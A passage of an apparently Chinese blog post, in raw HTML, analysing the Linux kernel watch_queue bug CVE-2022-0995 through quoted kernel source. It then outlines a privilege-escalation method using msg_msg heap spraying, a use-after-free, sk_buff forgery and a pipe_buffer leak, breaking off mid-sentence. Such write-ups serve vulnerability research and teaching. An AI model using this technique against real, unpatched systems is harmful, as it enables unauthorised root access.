class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> &#123;</span><br>        __u32   nr_filters;<br>        __u32   __reserved;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> <span class="hljs-title">filters</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p> <code>filters[]</code> 为一个 <code>watch_notification_type_filter</code> 类型的结构体数组，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> &#123;</span><br>        __u32   type;<br>        __u32   info_filter;<br>        __u32   info_mask;<br>        __u32   subtype_filter[<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>type</code> 为要过滤的事件类型，应当为类似 <code>WATCH_TYPE_KEY_NOTIFY</code> 的值</p></li><li><p><code>info_filter</code> 与 <code>info_mask</code> 充当通知记录的信息字段的过滤器，仅在以下情况才将通知写入缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(watch.info &amp; info_mask) == info_filter<br></code></pre></td></tr></table></figure><p>例如，这可以用于忽略不在一个挂载树上的观测点的事件</p></li><li><p><code>subtype_filter</code> 为一个指示我们感兴趣的子类型的 bitmask，<code>subtype_filter[0]</code> 的 0 位对应子类型 0，1 位对应子类型 1，以此类推</p></li></ul><p>若 ioctl() 的参数为 NULL，则过滤器将被移除，我们将接收到所有来自观测源的事件</p><h2 id="内核中-watch-queue-subsystem-中-Event-Filter-的实现"><a href="#内核中-watch-queue-subsystem-中-Event-Filter-的实现" class="headerlink" title="内核中 watch queue subsystem 中 Event Filter 的实现"></a>内核中 watch queue subsystem 中 Event Filter 的实现</h2><p>前面我们抄了一大段的 kernel document，现在我们来深入源码看一下 watch queue subsystem 的实现机制</p><p>当我们调用 <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> 时，会调用 <code>do_vfs_ioctl()</code> 判断 cmd 进行处理，而我们的 <code>IOC_WATCH_QUEUE_SET_FILTER</code> 不在其列表中，所以最后会走到 <code>vfs_ioctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(ioctl, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget(fd);<br><span class="hljs-type">int</span> error;<br><br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>error = security_file_ioctl(f.file, cmd, arg);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> out;<br><br>error = do_vfs_ioctl(f.file, fd, cmd, arg);<br><span class="hljs-keyword">if</span> (error == -ENOIOCTLCMD)<br>error = vfs_ioctl(f.file, cmd, arg);<br><br>out:<br>fdput(f);<br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>vfs_ioctl()</code> 中会调用 file 结构体自身的函数表中的 <code>unlocked_ioctl</code> 指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">vfs_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-type">int</span> error = -ENOTTY;<br><br><span class="hljs-keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)<br><span class="hljs-keyword">goto</span> out;<br><br>error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);<br><span class="hljs-keyword">if</span> (error == -ENOIOCTLCMD)<br>error = -ENOTTY;<br> out:<br><span class="hljs-keyword">return</span> error;<br>&#125;<br>EXPORT_SYMBOL(vfs_ioctl);<br></code></pre></td></tr></table></figure><p>那么这里我们需要将目光放回管道的创建流程中分配文件描述符的部分，存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">do_pipe2()<br>    __do_pipe_flags()<br>    create_pipe_files()<br>    alloc_file_pseudo()<br>    alloc_file()<br></code></pre></td></tr></table></figure><p><code>alloc_file()</code> 分配一个 file 结构体并将其函数表设为上层调用传入的函数表，而在 <code>create_pipe_files()</code> 中传入的函数表为 <code>pipefifo_fops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>.splice_write= iter_file_splice_write,<br>&#125;;<br></code></pre></td></tr></table></figure><p>因此最终调用到的是 <code>pipe_ioctl()</code>，对于 cmd <code>IOC_WATCH_QUEUE_SET_FILTER</code> 而言，最终会调用 <code>watch_queue_set_filter()</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">int</span> count, head, tail, mask;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FIONREAD:<br>__pipe_lock(pipe);<br>count = <span class="hljs-number">0</span>;<br>head = pipe-&gt;head;<br>tail = pipe-&gt;tail;<br>mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">while</span> (tail != head) &#123;<br>count += pipe-&gt;bufs[tail &amp; mask].len;<br>tail++;<br>&#125;<br>__pipe_unlock(pipe);<br><br><span class="hljs-keyword">return</span> put_user(count, (<span class="hljs-type">int</span> __user *)arg);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;<br><span class="hljs-type">int</span> ret;<br>__pipe_lock(pipe);<br>ret = watch_queue_set_size(pipe, arg);<br>__pipe_unlock(pipe);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:<br><span class="hljs-keyword">return</span> watch_queue_set_filter(<br>pipe, (<span class="hljs-keyword">struct</span> watch_notification_filter __user *)arg);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -ENOIOCTLCMD;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>漏洞便发生在 <code>watch_queue_set_filter()</code>中将 filter 数组从用户空间拷贝到内核空间的过程当中，现在让我们仔细审视这个函数的执行流程，在一开始时首先会将用户空间的 <code>watch_notification_filter</code> 结构拷贝到内核空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">watch_queue_set_filter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> watch_notification_filter __user *_filter)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> *<span class="hljs-title">tf</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> <span class="hljs-title">filter</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_type_filter</span> *<span class="hljs-title">q</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_filter</span> *<span class="hljs-title">wfilter</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">wqueue</span> =</span> pipe-&gt;watch_queue;<br><span class="hljs-type">int</span> ret, nr_filter = <span class="hljs-number">0</span>, i;<br><br><span class="hljs-keyword">if</span> (!wqueue)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-keyword">if</span> (!_filter) &#123;<br><span class="hljs-comment">/* Remove the old filter */</span><br>wfilter = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> <span class="hljs-built_in">set</span>;<br>&#125;<br><br><span class="hljs-comment">/* Grab the user&#x27;s filter specification */</span><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="hljs-keyword">sizeof</span>(filter)) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (filter.nr_filters == <span class="hljs-number">0</span> ||<br>    filter.nr_filters &gt; <span class="hljs-number">16</span> ||<br>    filter.__reserved != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br></code></pre></td></tr></table></figure><p>之后 <code>memdup_user()</code> 分配一块临时空间，将用户空间的 filter 数组拷贝至该临时空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="hljs-keyword">sizeof</span>(*tf));<br><span class="hljs-keyword">if</span> (IS_ERR(tf))<br><span class="hljs-keyword">return</span> PTR_ERR(tf);<br></code></pre></td></tr></table></figure><p>接下来会遍历每一个 <code>watch_notification_type_filter</code> 结构，记录 type 在指定范围的 filter 的数量到变量 <code>nr_filter</code> 中，这里其判断一个 type 是否合法的范围是 <code>sizeof(wfilter-&gt;type_filter) * 8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">ret = -EINVAL;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||<br>    tf[i].info_mask &amp; WATCH_INFO_LENGTH)<br><span class="hljs-keyword">goto</span> err_filter;<br><span class="hljs-comment">/* Ignore any unknown types */</span><br><span class="hljs-keyword">if</span> (tf[i].type &gt;= <span class="hljs-keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="hljs-number">8</span>)<br><span class="hljs-keyword">continue</span>;<br>nr_filter++;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会分配真正储存 filter 的的空间，这里用了一个 <code>struct_size()</code> 导出的大小为 <code>sizeof(wfilter) + sizeof(filters) * nr_filter</code>（感兴趣的同学可以自行阅读源码），注意到这里计算大小用的是我们前面遍历计算得到的 <code>nr_filter</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Now we need to build the internal filter from only the relevant</span><br><span class="hljs-comment"> * user-specified filters.</span><br><span class="hljs-comment"> */</span><br>ret = -ENOMEM;<br>wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!wfilter)<br><span class="hljs-keyword">goto</span> err_filter;<br>wfilter-&gt;nr_filters = nr_filter;<br></code></pre></td></tr></table></figure><p>之后是将 filter 数组拷贝到分配的空间上，<strong>我们的第一个漏洞便出现在这里，其判断 type 是否合法使用的是</strong> <code>sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</code> ，<strong>与前面 nr_filter 的计算存在不一致性</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">q = wfilter-&gt;filters;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-keyword">if</span> (tf[i].type &gt;= <span class="hljs-keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)<br><span class="hljs-keyword">continue</span>;<br><br>q-&gt;type= tf[i].type;<br>q-&gt;info_filter= tf[i].info_filter;<br>q-&gt;info_mask= tf[i].info_mask;<br>q-&gt;subtype_filter[<span class="hljs-number">0</span>]= tf[i].subtype_filter[<span class="hljs-number">0</span>];<br>__set_bit(q-&gt;type, wfilter-&gt;type_filter);<br>q++;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>BITS_PER_LONG</code> 定义于 <code>/include/asm-generic/bitsperlong.h</code> 中，<strong>在 32 位下为 32，64 位下为64</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITS_PER_LONG 64</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITS_PER_LONG 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_64BIT */</span></span><br></code></pre></td></tr></table></figure><p>那么前后对 type 范围的计算便存在不一致，我们不难想到的是<strong>我们可以指定几个 filter 的 type 为（计算 nr_filter 时的合法 type 上限值，拷贝 filter 时的合法 type 上限值）这个范围内的特定值，这样就能越界拷贝一定数量的 filter，从而完成堆上的越界写</strong></p><p>那么这里我们容易计算得出触发第一个漏洞的 type 的范围应为 <code>[0x80, 0x400)</code></p><p>而<strong>第二个漏洞则存在于上面这段代码中对</strong> <code>__set_bit()</code> <strong>的调用，该函数定义如下：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __set_bit(<span class="hljs-type">int</span> nr, <span class="hljs-keyword">volatile</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *addr)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mask = BIT_MASK(nr);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)addr) + BIT_WORD(nr);<br><br>*p  |= mask;<br>&#125;<br></code></pre></td></tr></table></figure><p>其作用便是<strong>将 addr 偏移 BIT_WORD(nr) 处的 BIT_MASK(mask) 位进行置 1 操作</strong>，这里的 <code>BIT_WORD()</code> 宏主要是除以 long 类型所占位数（64），而 <code>BIT_MASK()</code> 宏则是对 long 类型所占位数求模后结果作为 unsigned long 值 1 左移的位数导出结果数值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span><br></code></pre></td></tr></table></figure><p>而传入的第一个参数刚好为 type，由于我们的 type 可以在 <code>[0x80, 0x400)</code> 范围内取，<strong>而分配的 filter 空间却未必有那么大，因此这里存在一个越界置 1 位的漏洞，我们可以通过设置一个较大的 type 完成堆上越界置 1 位的操作</strong></p><p>例如对于 <code>kmalloc-96</code> 而言，我们的对象可以覆盖到下图所示范围（本图来自于 <a href="https://blog.csdn.net/Breeze_CAT/article/details/123845526">breezeO_o师傅的博客</a>）：</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>在<a href="https://github.com/Bonfee/CVE-2022-0995">目前公开的 exp</a> 中对该漏洞的利用其实是基于 <code>__set_bit()</code> 进行利用的，因为相较于不好控制的 filter 溢出，越界写 1 位则更方便我们控制一些指针，例如 <code>msg_msg-&gt;m_list</code> 双向链表</p><p>在这份公开的 exp 中使用的其实是与 CVE-2021-22555 相同的利用技巧，只不过篡改 <code>msg_msg</code> 头部的方式不是邻接溢出写 0，而是越界写 1；接下来笔者将<del>大幅拷贝</del>使用与 CVE-2021-22555 相同的利用技巧完成对该漏洞的利用</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息"><a href="#Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息" class="headerlink" title="Step.I 堆喷 msg_msg ，建立主从消息队列，构造重叠辅助消息"></a>Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列，构造重叠辅助消息</h3><p>现在我们有了一个堆上越界写 1 位，我们该怎么利用呢？比较朴素的一种思想便是覆写一个结构体中的指针，利用 partial overwrite 使得两个这样的结构体的头部指针指向同一个结构体，<strong>从而实现 object overlapping</strong></p><p>那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体，其长度可控，且开头正好是内核双向链表结构体，我们所能覆写的为其 next 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先创建多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 96，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>之后我们读出其中几个消息队列的主消息以产生空洞，再利用 <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> 获取到我们刚释放的 <code>msg_msg</code> 结构体的空间</p><p><img src="https://s2.loli.net/2022/04/06/pql2L98kxRvaZzA.png" alt="image.png"></p><p>这里需要注意的是<strong>我们至少要释放两个主消息，因为在分配到 watch_filter 之前 memdup_user() 还需要获取一个对象</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="hljs-keyword">sizeof</span>(*tf));<br><span class="hljs-keyword">if</span> (IS_ERR(tf))<br><span class="hljs-keyword">return</span> PTR_ERR(tf);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Now we need to build the internal filter from only the relevant</span><br><span class="hljs-comment"> * user-specified filters.</span><br><span class="hljs-comment"> */</span><br>ret = -ENOMEM;<br>wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);<br></code></pre></td></tr></table></figure><p>对于 <code>__set_bit()</code> 而言其可以置 1 的范围如下图所示，刚好可以覆盖到下一相邻 object 的前 16 字节</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png" alt="image.png"></p><p>利用越界置 1 位我们可以覆写到其相邻的主消息的 next 指针，若该位刚好被由 0 变为 1，则我们很容易构造出<strong>在两个消息队列上存在两个主消息指向同一个辅助消息</strong>的这样的局面</p><p><img src="https://s2.loli.net/2022/04/06/NWHMurcU36EsIAp.png" alt="image.png"></p><p>我们可以通过在主从消息中放置对应的值来标识喷射的不同的消息队列，遍历读取所有队列来感知指向了同一辅助消息的两个队列</p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-释放辅助消息，构造-UAF"><a href="#Step-II-释放辅助消息，构造-UAF" class="headerlink" title="Step.II 释放辅助消息，构造 UAF"></a>Step.II 释放辅助消息，构造 UAF</h3><p>此时我们将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/04/06/w9RE63dNuVjcmbp.png" alt="image.png"></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址"><a href="#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址" class="headerlink" title="Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址"></a>Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何利用这个 UAF，因为其仍位于消息队列上所以我们考虑伪造 <code>msg_msg</code> 结构体进行后续的利用，这里我们选用另外一个常用来进行堆喷的结构体——<code>sk_buff</code>，类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，</strong>我们不难想到的是<strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>接下来我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p><img src="https://s2.loli.net/2022/04/06/QEysxG1YmcUTBAj.png" alt="image.png"></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址"><a href="#Step-IV-堆喷-pipe-buffer，泄露内核基址" class="headerlink" title="Step.IV 堆喷 pipe_buffer，泄露内核基址"></a>Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 